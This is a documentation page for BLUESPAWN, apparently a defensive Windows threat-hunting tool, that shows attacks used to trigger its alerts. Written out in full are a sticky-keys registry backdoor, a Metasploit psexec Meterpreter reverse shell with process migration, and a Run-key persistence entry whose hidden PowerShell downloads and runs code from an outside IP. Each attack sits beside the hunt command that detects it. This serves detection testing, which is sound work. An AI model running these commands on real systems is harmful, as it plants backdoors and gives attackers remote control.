Examples of BLUESPWAN in Action
===============================

The below sections will outline a variety of commands/methods that can be used to get BLUESPAWN to trigger an alert to showcase how the program operates.

**NOTE:** Windows Defender or other security products running on the system may block the malware even more BLUESPAWN can pick it up. We recommend only running these tests on a clean, **NON-PRODUCTION** system, ideally with no other anti-virus if you are evaluating/demonstrating BLUESPAWN.

Monitor Mode
------------

You can launch monitor mode in one window and leave it open while performing any of the below attacks to generate alerts that was as well.

.. code-block:: cmd

   .\BLUESPAWN-client-x64.exe --monitor -a Normal --react=log --log=console,xml

T1546 - Accessibility Features
------------------------------

Install a sticky keys backdoor

.. code-block:: cmd

   reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"

Perform a Hunt with BLUESPAWN for T1546

.. code-block:: cmd

   .\BLUESPAWN-client-x64.exe --hunt -a Normal --hunts=T1546 --react=log,remove-value --log=console,xml

T1055 - Process Injection
-------------------------

Launch a Meterpreter beacon on the target, for example, using PsExec with valid credentials

.. code-block:: bash

   sudo msfconsole
   use exploit/windows/smb/psexec
   set RHOSTS 172.17.50.136
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST YOUR_IP
   set LPORT 4444
   exploit

   <spawning of a meterpreter beacon>

   ps # find the PID of a target process to migrate to such as explorer.exe
   migrate PID

Perform a Hunt with BLUESPAWN for T1055

.. code-block:: cmd

   .\BLUESPAWN-client-x64.exe --hunt -a Normal --hunts=T1055 --react=log,carve-memory --log=console,xml

T1547 - Registry Run Keys / Startup Folder
------------------------------------------

Configure a malicious run key

.. code-block:: cmd

   reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f

Perform a Hunt with BLUESPAWN for T1547 

.. code-block:: cmd

   .\BLUESPAWN-client-x64.exe --hunt -a Normal --hunts=T1547 --react=log,remove-value --log=console,xml

